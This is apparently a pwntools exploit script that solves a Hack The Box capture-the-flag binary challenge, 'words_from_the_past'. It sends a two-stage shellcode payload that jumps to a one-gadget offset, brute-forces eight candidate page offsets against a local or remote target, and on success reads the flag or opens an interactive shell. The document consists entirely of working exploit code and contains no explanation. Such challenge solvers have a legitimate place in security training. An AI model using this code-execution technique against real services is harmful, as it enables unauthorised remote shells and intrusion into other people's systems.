#!/usr/bin/python3
from pwn import *
import warnings
import os
warnings.filterwarnings('ignore')
context.arch = 'amd64'
context.terminal = ['tmux','splitw','-h']
context.log_level = 'critical'

fname = '../challenge/words_from_the_past'

LOCAL = False

os.system('clear')

if LOCAL:
  print('Running solver locally..\n')
else:
  IP   = str(sys.argv[1]) if len(sys.argv) >= 2 else '0.0.0.0'
  PORT = int(sys.argv[2]) if len(sys.argv) >= 3 else 1337
  print(f'Running solver remotely at {IP} {PORT}\n')

OG = 0x583F3
STAGE1 = b"\xe8\xd0\x06\xff\xff"

def get_flag(p):
  pause(1)
  p.sendline('cat flag* 2>/dev/null')
  flag = p.recvline_contains(b"HTB", timeout=0.2).strip().decode()
  if len(flag) == 0:
    print('\n~~ Shell ~~\n')
    p.interactive()
  else:
    print(f'\n[+] Flag --> {flag}')

def try_offset(off):
  if LOCAL:
    p = process(fname)
  else:
    p = remote(IP, PORT)
  p.recvuntil(b'lethal..\n')
  rel = OG + off - 5
  stage2 = b"\xe9" + p32(rel, signed=True)
  p.send(STAGE1 + stage2 + b'id\n')
  try:
    out = p.recvrepeat(0.8)
  except EOFError:
    out = b''
  if b'uid' in out:
    return p, True, out
  p.close()
  return None, False, out

# Brute-force the 8 possible page2 offsets
offsets = [0x1000000 + i*0x1000 for i in range(8)]
for idx, off in enumerate(offsets, 1):
  print(f'[*] Trying offset 0x{off:x} ({idx}/{len(offsets)})')
  p, ok, out = try_offset(off)
  if ok:
    print(f'[+] Shell acquired with offset 0x{off:x}!')
    if out:
      print(out.decode('utf-8', errors='replace'), end='')
    get_flag(p)
    break
else:
  print('[-] All offsets exhausted without success')
